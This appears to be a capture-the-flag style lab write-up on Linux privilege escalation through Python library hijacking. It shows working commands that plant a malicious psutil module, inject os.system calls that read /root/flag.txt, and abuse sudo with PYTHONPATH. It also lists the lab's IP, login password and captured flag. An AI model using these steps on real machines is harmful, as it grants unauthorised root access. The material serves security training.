Python libraries can be hijacked via the following ways:
- wrong write permissions. i.e., the SUID bit is set for a file or other resource
- library path
- PYTHONPATH environment variable

### Library Path Listing

The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. Executing the below command will show the order of modules imported by Python:

```shell-session
python3 -c 'import sys; print("\n".join(sys.path))'
```
```shell-session
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

> [!NOTE] This method requires two pre-requisites:
>1. ==The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.==
>2. ==We must have write permissions to one of the paths having a higher priority on the list.==

View a programs default install location:
```
pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

```

The above shows that psutil is installed at `/usr/local/lib/python3.8/dist-packages`. See if you have write access to the python3.8 directory. 

```
ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
```

Confirming you do, this satisfies the first criteria of having write permissions to one of the higher priority paths. The `PYTHONPATH` showed the path `/usr/lib/python3.8` is higher on the list than `/usr/local/lib/python3.8/dist-packages` where `psutils` is installed.

```
python3 -c 'import sys; print("\n".join(sys.path))'

shell-session
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Solution: Take advantage of this misconfiguration by creating your own `psutils` module containing your own malicious `virtual_memory()` function in the `/usr/lib/python3.8`

> [!NOTE] In a previous example, the mem_status script, which used the virtual_memory() function, was found to be writeable to all users. I will recreate this in a file below called psutil.py. This file must have all the same parameters, functions and name as the imported psutil.py.

```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

### Privilege Escalation via Hijacking Python Library Path
```
sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```
### PYTHONPATH 

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.

Assume you are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV`
```shell-session
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
   (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program.

```shell-session
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

# Questions

IP
```
10.129.205.114
```

USERNAME
```
htb-student
```

PASSWD
```
HTB_@cademy_stdnt!
```

SSH
```
ssh htb-student@10.129.205.114
```

Although it's the same as the examples in the module, proceed as if you have no information.

### Enumeration

**Finding writeable files in the htb-student's home folder**
```
htb-student@ubuntu:~$ find /home/htb-student -type f -perm -04000 -ls 2>/dev/null
3724      4 -rwSrwxr-x   1 root     root          192 May 19  2023 /home/htb-student/mem_status.py
```

The file `mem_status.py` has the SUID bit set. We can also read the contents and execute the script.

Viewing the file, I see it's being called by psutil which is imported. psutil is also calling the function `virtual_memory()` 
```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Find the default location of psutil: ==/usr/local/lib/python3.8/dist-packages==
```
htb-student@ubuntu:~$ pip3 show psutil
Name: psutil
Version: 5.9.5
Summary: Cross-platform lib for process and system monitoring in Python.
Home-page: https://github.com/giampaolo/psutil
Author: Giampaolo Rodola
Author-email: g.rodola@gmail.com
License: BSD-3-Clause
Location: /usr/local/lib/python3.8/dist-packages
Requires: 
Required-by: 
htb-student@ubuntu:~$ 
```

The the __init__.py function appears to be writeable by our user, `htb-student`
```
htb-student@ubuntu:~$ ls -la /usr/local/lib/python3.8/dist-packages/psutil
total 568
drwxr-sr-x 4 root        staff   4096 Jun  7  2023 .
drwxrwsr-x 6 root        staff   4096 Jun  5  2023 ..
-rw-r--r-- 1 root        staff  29181 May 19  2023 _common.py
-rw-r--r-- 1 root        staff  15025 May 19  2023 _compat.py
-rw-r--r-- 1 htb-student staff  87657 Jun  8  2023 __init__.py
-rw-r--r-- 1 root        staff  18665 May 19  2023 _psaix.py
-rw-r--r-- 1 root        staff  31769 May 19  2023 _psbsd.py
-rw-r--r-- 1 root        staff  86913 May 19  2023 _pslinux.py
-rw-r--r-- 1 root        staff  16275 May 19  2023 _psosx.py
-rw-r--r-- 1 root        staff   8245 May 19  2023 _psposix.py
-rw-r--r-- 1 root        staff  25486 May 19  2023 _pssunos.py
-rwxr-xr-x 1 root        staff 107400 May 19  2023 _psutil_linux.abi3.so
-rwxr-xr-x 1 root        staff  71008 May 19  2023 _psutil_posix.abi3.so
-rw-r--r-- 1 root        staff  37425 May 19  2023 _pswindows.py
drwxr-sr-x 2 root        staff   4096 Jun  5  2023 __pycache__
drwxr-sr-x 3 root        staff   4096 Jun  5  2023 tests
htb-student@ubuntu:~$ 
```

The `virtual_memory()` function is found on line 1920. Here you will place the following inside the function:
```
import os
os.system('cat /root/flag.txt')
```

Execute and you will get the root flagt:
```
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
Available memory: 88.78%
```



